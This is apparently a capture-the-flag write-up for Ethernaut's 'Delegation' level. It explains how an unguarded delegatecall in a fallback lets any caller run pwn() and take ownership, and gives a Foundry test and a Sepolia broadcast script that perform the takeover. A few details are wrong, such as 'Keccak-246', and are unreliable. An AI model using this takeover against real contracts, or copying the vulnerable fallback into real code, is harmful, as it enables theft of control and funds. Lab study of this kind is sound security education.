## Delegration

<br>


 
<p align="center">
<img width="300" src=""">
</p>


<br>


### tl; dr

<br>


* in this challenge, we leverage an attack surface generated from implementing the low-level function `delegatecall` (from opcode `DELEGATECALL`) to become `owner`.

<br>

* exploitation of `delegatecall()` has been in several hacks

<br>
 

```solidity
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```


<br>

---

### discussion

<br>

* `delegatecall()` is a way to **[make external calls to another contracts](https://solidity-by-example.org/delegatecall/)**.
    - when a contract executes `DELEGATECALL` to another contract, this contract is executed with the original contract `msg.sender`, `msg.value`, and storage (in particular, the contract's storage can be changed).
    - `delegatecall()` is important when writing libraries (*i.e.*, dividing your smart contract into smaller parts) and for proxy patterns.

<br>

* in this problem, we are provided with two contracts. `Delegate()` is the parent contract, which we want to become an owner. conveniently, the function `pwn()` is very explicit on being our target:

<br>

```solidity
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}
```

<br>

* also note that the variable `owner` is in the first slot of both contracts. 
    - ordering of variable slots (and their mismatches) are what `DELEGATECALL` exploits in the wild usually explore.
    - because we are dealing with opcodes this  is important, as every variable has its specific slot and should match in both origin and destination contract.

<br>

* the second contract, which we have access, is `Delegation()`, which has another convenience: a `delegatecall()` in the `fallback` function.


<br>

```solidity
contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

<br>

* from a previous challenge, we know that fallback functions are like a "catch all" in a contract, so it's pretty easy to access them. 
    - in addition, in this particular case, `delegatecall()` takes `msg.data` as input (i.e., whatever data we pass when we trigger the fallback). it's pretty much an `exec`: we can pass function calls through it.

<br>

* the last information we need is to learn how `deletecall()` passes arguments. the function signatures are encoded by computing Keccak-246 and keeping the first 4 bytes (these bytes are the function selector in the EVM).

<br>

```solidity
delegatecall(abi.encodeWithSignature("func_signature", "arguments"));
```

<br>

* in our attack we will use `call(abi.encodeWithSignature("pwn()")` to trigger `fallback() and become `owner`, which is also equivalent with `sendTransaction()`:

<br>

```solidity
sendTransaction({ 
    to: contract.address, 
    data: web3.eth.abi.encodeFunctionSignature("pwn()"), 
    from: hackerAddress
 })
```



<br>



----

### solution

<br>

* check `test/06/Delegation.t.sol`:

<br>

```solidity
contract DelegationTest is Test {

    Delegate public delegate = new Delegate(makeAddr("owner"));
    Delegation public level = new Delegation(address(delegate));

    address instance = vm.addr(0x1); 
    address hacker = vm.addr(0x2); 

    function setUp() public {
        vm.prank(instance);
    }

    function testDelegationHack() public {

        vm.startPrank(hacker);
        assertNotEq(level.owner(), hacker);

        (bool success, ) = address(level).call(
            abi.encodeWithSignature("pwn()")
        );
        assertTrue(success);
        assertEq(level.owner(), hacker);

        vm.stopPrank();
        
    }
}
```

<br>

* run:

<br>

```shell
> forge test --match-contract DelegationTest -vvvv    
```



<br>

* submit with `script/06/Delegation.s.sol`:

<br>

```solidity
import "forge-std/Script.sol";
import {Delegation} from "src/06/Delegation.sol";


contract Exploit is Script {

        address levelInstance = 0x336a9B16f89367082e234E0eeAeE9a3Bf61caeEE;
        Delegation level = Delegation(levelInstance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            
            (bool success, ) = address(level).call(
                abi.encodeWithSignature("pwn()")
            );
            require(success);
            
            vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/06/Delegation.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>

----

<br>

#### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



